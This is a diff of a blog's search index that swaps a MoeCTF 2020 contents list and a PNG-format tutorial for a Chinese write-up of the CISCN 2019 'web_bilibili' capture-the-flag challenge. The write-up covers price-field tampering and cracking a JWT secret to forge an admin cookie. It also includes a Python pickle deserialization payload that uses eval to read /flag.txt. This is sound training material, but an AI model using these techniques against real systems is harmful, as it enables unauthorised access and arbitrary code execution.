@@ -1,657 +1,148 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>MoeCTF 2020 WriteUp</title>
-    <url>/2020/09/28/MoeCTF2020/</url>
-    <content><![CDATA[<h1 id="比赛介绍"><a href="#比赛介绍" class="headerlink" title="比赛介绍"></a>比赛介绍</h1><blockquote>
-<p>MoeCTF是西安电子科技大学一年一度的信息安全新生夺旗赛, 由西电信息安全协会面向全体准大学生举办, 题目难度不高且坡度平缓, 比赛平台开设时间很长, 0基础新生可以通过本次比赛对信息安全夺旗赛(CTF)有一个基础且全面的认识, 中学参加过一些CTF比赛的准大学生们也可以通过本次比赛重温CTF赛事.</p>
-<p>MoeCTF除了设有常规CTF比赛相关的分类之外也开设或有计划开设了算法编程类, 运维类, 旨在提供一个知识覆盖全面的做题环境, 同时帮助有过信息学竞赛经历的新生们更快转型.</p>
-</blockquote>
-<a id="more"></a>
-<blockquote>
-<p>MoeCTF的积分方式为最简单的静态积分方式, 选手解题并获取固定的分数, 不设动态积分, 不设一血加成, 选手即使在比赛进行时参赛也不必担心分数差距. 部分题目出题人可能提供题目奖励, 比赛本身无奖项. 比赛结束后平台会继续维护一周供各位选手复盘, 写题解. 西电新生们比赛结束后可能会要求提交题解, 作为西电信息安全协会(XDSEC)2020秋季招新的一个重要砝码. 欢迎大家前来参加比赛, 与各路极客同台竞技, 也欢迎新生们在比赛结束后加入XDSEC, 分享技术, 共同进步!</p>
-<p>西电信息安全协会(XDSEC)是由08, 09级学长自发组建的学生组织, 面向全校各年级同学 ,期间多次与学校合作, 自行管理和发展至今. 协会资源丰富, 在信息安全领域口碑十分优秀. 协会以致力于技术分享与进步为宗旨, 秉承低调, 分享, 专注, 精进, 自由的精神, 旨在为我校热爱信息安全技术的同学建立一个氛围良好的交流平台, 扩大信息安全在我校的影响力.</p>
-</blockquote>
-<hr>
-<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="Re-7"><a href="#Re-7" class="headerlink" title="Re (-7)"></a>Re (-7)</h2><ol>
-<li>逆向工程入门指南（略）</li>
-<li>Welcome To Re</li>
-<li>Thank you Java</li>
-<li>SimpleRe</li>
-<li>Protection</li>
-<li>Real EasyPython</li>
-<li>RollCall</li>
-<li>RxEncode</li>
-</ol>
-<h2 id="Pwn-5"><a href="#Pwn-5" class="headerlink" title="Pwn (-5)"></a>Pwn (-5)</h2><ol>
-<li>Welcome to pwn（略）</li>
-<li>Pwn从入门到入狱（略）</li>
-<li>Baby pwn</li>
-<li>Baby shellcode</li>
-<li>unusual shellcode</li>
-</ol>
-<h2 id="Algorithm-3"><a href="#Algorithm-3" class="headerlink" title="Algorithm (-3)"></a>Algorithm (-3)</h2><ol>
-<li>mess</li>
-<li>Frank，永远滴神</li>
-<li>赤道企鹅，永远滴神</li>
-<li>千层饼</li>
-</ol>
-<h2 id="Crypto-7"><a href="#Crypto-7" class="headerlink" title="Crypto (-7)"></a>Crypto (-7)</h2><ol>
-<li>crypto入门指北（略）</li>
-<li>easycrypto</li>
-<li>rsa_begin</li>
-</ol>
-<h2 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc (-4)"></a>Misc (-4)</h2><ol>
-<li>Welcome</li>
-<li>MD5</li>
-<li>base64</li>
-<li>hey fxck you！</li>
-<li>base64？¿</li>
-<li>Pseudo Encrypt</li>
-<li>不 会 吧 ？ 就 这 ¿</li>
-<li>Cor1e的支票</li>
-<li>A3FXCK</li>
-<li>⑨的完美算数教室</li>
-<li>停不下来了啊啊啊啊啊啊啊</li>
-<li>星空</li>
-<li>简单的社工题</li>
-</ol>
-<h2 id="Classic-Crypto-fin"><a href="#Classic-Crypto-fin" class="headerlink" title="Classic Crypto (fin)"></a>Classic Crypto (fin)</h2><ol>
-<li>大帝的征程#1</li>
-<li>大帝的征程#2</li>
-<li>外面的世界</li>
-<li>大帝的征程#3</li>
-<li>大帝的征程#维吉尼亚</li>
-<li>大帝的征程#维吉尼亚Ex</li>
-</ol>
-<h2 id="Web-fin"><a href="#Web-fin" class="headerlink" title="Web (fin)"></a>Web (fin)</h2><ol>
-<li>GET</li>
-<li>POST</li>
-<li>小饼干</li>
-<li>Introduction</li>
-<li>一句话</li>
-<li>EzMath</li>
-<li>三心二意</li>
-<li>俄罗斯头套</li>
-<li>Moe include</li>
-<li>Moe unserialize</li>
-<li>EzXXE</li>
-</ol>
-<h2 id="Android-fin"><a href="#Android-fin" class="headerlink" title="Android (fin)"></a>Android (fin)</h2><ol>
-<li>Click It！</li>
-<li>Baby Andriod</li>
-</ol>
-<h2 id="Sign-in（略）-fin"><a href="#Sign-in（略）-fin" class="headerlink" title="Sign in（略）(fin)"></a>Sign in（略）(fin)</h2><h2 id="DevOps-1"><a href="#DevOps-1" class="headerlink" title="DevOps (-1)"></a>DevOps (-1)</h2><h2 id="IoT-1"><a href="#IoT-1" class="headerlink" title="IoT (-1)"></a>IoT (-1)</h2><hr>
-<p><font size=14pt>WP具体内容将在比赛结束后放出</font></p>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>CISCN 2019 web_bilibili</title>
+      <link href="2020/09/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_5421_Web_bilibili/"/>
+      <url>2020/09/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_5421_Web_bilibili/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CISCN-2019-web-bilibili"><a href="#CISCN-2019-web-bilibili" class="headerlink" title="CISCN 2019 web_bilibili"></a>CISCN 2019 web_bilibili</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5421&amp;page=3">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5421&amp;page=3</a></p><h2 id="题目提示"><a href="#题目提示" class="headerlink" title="题目提示"></a>题目提示</h2><p>薅羊毛与逻辑漏洞</p><a id="more"></a><h2 id="网站截图"><a href="#网站截图" class="headerlink" title="网站截图"></a>网站截图</h2><p><img src="https://i.loli.net/2020/09/29/hH8jkoWqmZvMy1f.jpg" alt="1.jpg"></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>先注册试试看。注册成功后尝试购买了一个账号，成功。</p><p><img src="https://i.loli.net/2020/09/29/8bAeomj5KkdDnW1.png" alt="image-20200807180927483.png"></p></li><li><p>浏览一下网页，发现了这样一句话：一定要买到lv6。突然想到之前ik*n买lv6账号爆睿站的事情。大概翻了几页，没看到lv6。检查元素后发现，每个等级对应的图片名称就是<code>lv</code>+等级+<code>.png</code></p><p><img src="https://i.loli.net/2020/09/29/CUIRvkdMwr52GZs.png" alt="image-20200807181222993.png"></p></li><li><p>python脚本伺候.找到第181页有lv6账号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">r&#x27;http://220.249.52.133:47045/shop?page=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    req = requests.get(url + str(page))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(<span class="string">&#x27;[+]FOUND!\n[+]At page&#x27;</span>,page)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>找到一个叫b*sh*的账号.价格真够贵.居然要1145141919,这么臭的价格,真的有买的必要吗?买一下试试,果然操作失败.</p><p><img src="https://i.loli.net/2020/09/29/WhcD5Iy8jq9HdSp.png" alt="image-20200807182130307.png"></p></li><li><p>发现有一个叫折扣的东西,看一下源代码.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;jumbotron&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>购物车<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;shopcar_list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list-group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;list-group-item&quot;</span>&gt;</span>b*sh* <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span> /</span><br><span class="line">1145141919.0</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>优惠券:-20.0%<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>916113535.2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_xsrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2|632dee6f|b462f5648dfa4b927eeb9581ad057b17|1596793343&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1624&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;price&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1145141919.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;discount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0.8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>结算<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意到其中13-15行居然都是input标签,尝试修改.修改价格失败,修改折扣成功.点击结算后显示页面仅允许admin访问.</p><p><img src="https://i.loli.net/2020/09/29/p1YEPOjqwRyZmG7.png" alt="image-20200807182852209.png"></p></li><li><p>已经登陆账号,再有身份验证就应该和cookies有关了.查看cookies,有一个JWT.</p><p><img src="https://i.loli.net/2020/09/29/PVco83aCzr7suQS.png" alt="image-20200807183041972.png"></p></li></ol><blockquote><p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准&lt;a href=<a href="https://link.jianshu.com/?t=https://tools.ietf.org/html/rfc7519r&gt;RFC">https://link.jianshu.com?t=https://tools.ietf.org/html/rfc7519r&gt;RFC</a> 7519</a>.该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p></blockquote><p>​        搜索JWT后找到了相关工具<a href=https://github.com/brendan-rius/c-jwt-cracker>jwt cracker</a>,破解SHA256，得到密钥1Kun</p><p>​            <img src="https://i.loli.net/2020/09/29/lyZhgSHod3tC7OM.png" alt="image-20200807185740445.png"></p><p>​        在JWT.io生成新的JWT</p><p><img src="https://i.loli.net/2020/09/29/WLFDPoYiymVx8fG.png" alt="image-20200807191017303.png"></p><p>​        修改cookies后刷新。</p><p><img src="https://i.loli.net/2020/09/29/jVE9oqwDz5fNdQG.png" alt="image-20200807191006876.png"></p><p>​        进入到新的界面，然而按钮点击无效。查看源码。</p><p><img src="https://i.loli.net/2020/09/29/yKaz46ChpvxgfQR.png" alt="image-20200807191126831.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui text container login-wrap-inf&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/static/asd1f654e683wq/www.zip&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden&quot;</span>&gt;</span>删库跑路前我留了好东西在这里<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segments center padddd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/b.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span>This is Black Technology!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/b1g_m4mber&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_xsrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2|7d6064a8|aa2f7fa393b7c15560a61f46b348f1d0|1596793343&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">hidden</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;f-m ui segment&quot;</span> <span class="attr">name</span>=<span class="string">&quot;become&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ui secondary button &quot;</span>&gt;</span>一键成为大会员<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​        绝了，这题做着做着，还有剧情了。<br>​        在网页上检查元素，删掉第14行中的hidden=”hidden”，显示出输入栏<br>​        第3行中有一个压缩文件，下载解压后得到了网站的源码。其中有admin.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        到这里我不会了，打开admin.py，把里面不认识的函数+漏洞作为关键词挨个搜索了之后，urllib.load()这个函数存在一个反序列化漏洞。按照blog里的仿写一个payload。<a href=https://www.cnblogs.com/cimuhuashuimu/p/11544463.html>反序列化漏洞</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只能使用python2，python3因为不明原因无法正常生成payload</span></span><br><span class="line"><span class="keyword">import</span> pickle <span class="keyword">as</span> p</span><br><span class="line"><span class="keyword">import</span> urllib <span class="keyword">as</span> u</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&#x27;open(&quot;/flag.txt&quot;,&quot;r&quot;).read()&#x27;</span>,))</span><br><span class="line">a = p.dumps(payload())</span><br><span class="line">a = u.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>​        将输出的payload填进输入栏后即得到flag</p><p><img src="https://i.loli.net/2020/09/29/d14Rh3wYqOgWezu.png" alt="image-20200807193720295.png"></p>]]></content>
+      
+      
       <categories>
-        <category>CTF</category>
-        <category>WriteUp</category>
+          
+          <category> CTF </category>
+          
+          <category> WriteUp </category>
+          
       </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>MoeCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PNG文件结构</title>
-    <url>/2020/09/28/png%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
-    <content><![CDATA[<p>根据PNG文件的定义来说，其文件头位置总是由位固定的字节来描述的：</p>
-<table>
-<thead>
-<tr>
-<th align="center">十进制数</th>
-<th align="center">137 80 78 71 13 10 26 10</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">十六进制数</td>
-<td align="center">89 50 4E 47 0D 0A 1A 0A</td>
-</tr>
-</tbody></table>
-<p>其中第一个字节0x89超出了ASCII字符的范围，这是为了避免某些软件将PNG文件当做文本文件来处理。文件中剩余的部分由3个以上的PNG的数据块（Chunk）按照特定的顺序组成，因此，一个标准的PNG文件结构应该如下：</p>
-<ul>
-<li><p>PNG文件标志</p>
-</li>
-<li><p>PNG数据块 </p>
-</li>
-<li><p>……  </p>
-</li>
-<li><p>PNG数据块 </p>
-</li>
-</ul>
-<a id="more"></a>
-<hr>
-<p><strong>PNG数据块（Chunk）</strong></p>
-<p>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了4个标准数据块，每个PNG文件都必须包含它们，PNG读写软件也都必须要支持这些数据块。虽然PNG文件规范没有要求PNG编译码器对可选数据块进行编码和译码，但规范提倡支持可选数据块。</p>
-<p>下表就是PNG中数据块的类别，其中，关键数据块部分我们使用深色背景加以区分。</p>
-<table>
-<thead>
-<tr>
-<th><strong>PNG文件格式中的数据块</strong></th>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>数据块符号</strong></td>
-<td><strong>数据块名称</strong></td>
-<td><strong>多数据块</strong></td>
-<td><strong>可选否</strong></td>
-<td><strong>位置限制</strong></td>
-</tr>
-<tr>
-<td>IHDR</td>
-<td>文件头数据块</td>
-<td>否</td>
-<td>否</td>
-<td>第一块</td>
-</tr>
-<tr>
-<td>cHRM</td>
-<td>基色和白色点数据块</td>
-<td>否</td>
-<td>是</td>
-<td>在PLTE和IDAT之前</td>
-</tr>
-<tr>
-<td>gAMA</td>
-<td>图像γ数据块</td>
-<td>否</td>
-<td>是</td>
-<td>在PLTE和IDAT之前</td>
-</tr>
-<tr>
-<td>sBIT</td>
-<td>样本有效位数据块</td>
-<td>否</td>
-<td>是</td>
-<td>在PLTE和IDAT之前</td>
-</tr>
-<tr>
-<td>PLTE</td>
-<td>调色板数据块</td>
-<td>否</td>
-<td>是</td>
-<td>在IDAT之前</td>
-</tr>
-<tr>
-<td>bKGD</td>
-<td>背景颜色数据块</td>
-<td>否</td>
-<td>是</td>
-<td>在PLTE之后IDAT之前</td>
-</tr>
-<tr>
-<td>hIST</td>
-<td>图像直方图数据块</td>
-<td>否</td>
-<td>是</td>
-<td>在PLTE之后IDAT之前</td>
-</tr>
-<tr>
-<td>tRNS</td>
-<td>图像透明数据块</td>
-<td>否</td>
-<td>是</td>
-<td>在PLTE之后IDAT之前</td>
-</tr>
-<tr>
-<td>oFFs</td>
-<td>(专用公共数据块)</td>
-<td>否</td>
-<td>是</td>
-<td>在IDAT之前</td>
-</tr>
-<tr>
-<td>pHYs</td>
-<td>物理像素尺寸数据块</td>
-<td>否</td>
-<td>是</td>
-<td>在IDAT之前</td>
-</tr>
-<tr>
-<td>sCAL</td>
-<td>(专用公共数据块)</td>
-<td>否</td>
-<td>是</td>
-<td>在IDAT之前</td>
-</tr>
-<tr>
-<td>IDAT</td>
-<td>图像数据块</td>
-<td>是</td>
-<td>否</td>
-<td>与其他IDAT连续</td>
-</tr>
-<tr>
-<td>tIME</td>
-<td>图像最后修改时间数据块</td>
-<td>否</td>
-<td>是</td>
-<td>无限制</td>
-</tr>
-<tr>
-<td>tEXt</td>
-<td>文本信息数据块</td>
-<td>是</td>
-<td>是</td>
-<td>无限制</td>
-</tr>
-<tr>
-<td>zTXt</td>
-<td>压缩文本数据块</td>
-<td>是</td>
-<td>是</td>
-<td>无限制</td>
-</tr>
-<tr>
-<td>fRAc</td>
-<td>(专用公共数据块)</td>
-<td>是</td>
-<td>是</td>
-<td>无限制</td>
-</tr>
-<tr>
-<td>gIFg</td>
-<td>(专用公共数据块)</td>
-<td>是</td>
-<td>是</td>
-<td>无限制</td>
-</tr>
-<tr>
-<td>gIFt</td>
-<td>(专用公共数据块)</td>
-<td>是</td>
-<td>是</td>
-<td>无限制</td>
-</tr>
-<tr>
-<td>gIFx</td>
-<td>(专用公共数据块)</td>
-<td>是</td>
-<td>是</td>
-<td>无限制</td>
-</tr>
-<tr>
-<td>IEND</td>
-<td>图像结束数据</td>
-<td>否</td>
-<td>否</td>
-<td>最后一个数据块</td>
-</tr>
-</tbody></table>
-<p>为了简单起见，我们假设在我们使用的PNG文件中，这4个数据块按以上先后顺序进行存储，并且都只出现一次。</p>
-<p><strong>数据块结构</strong></p>
-<p>PNG文件中，每个数据块由4个部分组成，如下：</p>
-<table>
-<thead>
-<tr>
-<th><strong>名称</strong></th>
-<th><strong>字节数</strong></th>
-<th><strong>说明</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Length (长度)</td>
-<td>4字节</td>
-<td>指定数据块中数据域的长度，其长度不超过(231－1)字节</td>
-</tr>
-<tr>
-<td>Chunk Type Code (数据块类型码)</td>
-<td>4字节</td>
-<td>数据块类型码由ASCII字母(A-Z和a-z)组成</td>
-</tr>
-<tr>
-<td>Chunk Data (数据块数据)</td>
-<td>可变长度</td>
-<td>存储按照Chunk Type Code指定的数据</td>
-</tr>
-<tr>
-<td>CRC (循环冗余检测)</td>
-<td>4字节</td>
-<td>存储用来检测是否有错误的循环冗余码</td>
-</tr>
-</tbody></table>
-<p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：</p>
-<p>x^32^+x^26^+x^23^+x^22^+x^16^+x^12^+x^11^+x^10^+x^8^+x^7^+x^5^+x^4^+x^2^+x+1</p>
-<p>CRC: 一种校验算法。仅仅用来校验数据的正确性的</p>
-<p>下面，我们依次来了解一下各个关键数据块的结构吧。</p>
-<p><strong>IHDR</strong></p>
-<p>文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p>
-<p>文件头数据块由13字节组成，它的格式如下表所示。</p>
-<table>
-<thead>
-<tr>
-<th><strong>域的名称</strong></th>
-<th><strong>字节数</strong></th>
-<th><strong>说明</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Width</td>
-<td>4 bytes</td>
-<td>图像宽度，以像素为单位</td>
-</tr>
-<tr>
-<td>Height</td>
-<td>4 bytes</td>
-<td>图像高度，以像素为单位</td>
-</tr>
-<tr>
-<td>Bit depth</td>
-<td>1 byte</td>
-<td>图像深度：   索引彩色图像：1，2，4或8   灰度图像：1，2，4，8或16   真彩色图像：8或16</td>
-</tr>
-<tr>
-<td>ColorType</td>
-<td>1 byte</td>
-<td>颜色类型：  0：灰度图像, 1，2，4，8或16   2：真彩色图像，8或16   3：索引彩色图像，1，2，4或8   4：带α通道数据的灰度图像，8或16   6：带α通道数据的真彩色图像，8或16</td>
-</tr>
-<tr>
-<td>Compression method</td>
-<td>1 byte</td>
-<td>压缩方法(LZ77派生算法)</td>
-</tr>
-<tr>
-<td>Filter method</td>
-<td>1 byte</td>
-<td>滤波器方法</td>
-</tr>
-<tr>
-<td>Interlace method</td>
-<td>1 byte</td>
-<td>隔行扫描方法：  0：非隔行扫描   1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td>
-</tr>
-</tbody></table>
